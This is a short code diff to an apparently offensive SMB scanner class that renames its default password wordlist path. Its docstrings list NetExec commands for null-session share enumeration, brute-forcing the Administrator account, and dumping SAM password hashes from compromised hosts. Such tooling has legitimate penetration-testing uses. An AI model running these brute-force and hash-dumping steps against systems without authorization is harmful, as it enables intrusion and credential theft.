@@ -5,7 +5,7 @@ SMB credentials on hosts where nmap discovered SMB ports.
 
 For each IP with SMB port (445/139) open:
   1. Test anonymous/null auth: nxc smb <IP> -u Anonymous -p Test --shares
-  2. Brute-force with Administrator: nxc smb <IP> -u Administrator -p kamus-pass.txt --shares
+  2. Brute-force with Administrator: nxc smb <IP> -u Administrator -p wordlists/enum-pass.txt --shares
   3. If credentials found with Pwn3d!, dump SAM hashes:
      nxc smb <IP> -u <user> -p <pass> --sam
 
@@ -234,11 +234,11 @@ class SMBBruteScanner:
 
     After nmap discovers hosts with SMB port open (445/139):
       1. Test anonymous/null auth: nxc smb <IP> -u Anonymous -p Test --shares
-      2. Brute-force with default users (Administrator) + kamus-pass.txt
+      2. Brute-force with default users (Administrator) + wordlists/enum-pass.txt
       3. If Pwn3d!, dump SAM hashes: nxc smb <IP> -u <user> -p <pass> --sam
     """
 
-    DEFAULT_PASS_FILE = "kamus-pass.txt"
+    DEFAULT_PASS_FILE = os.path.join("wordlists", "enum-pass.txt")
 
     def __init__(self, config: ScannerConfig, pass_file: str = ""):
         self.config = config
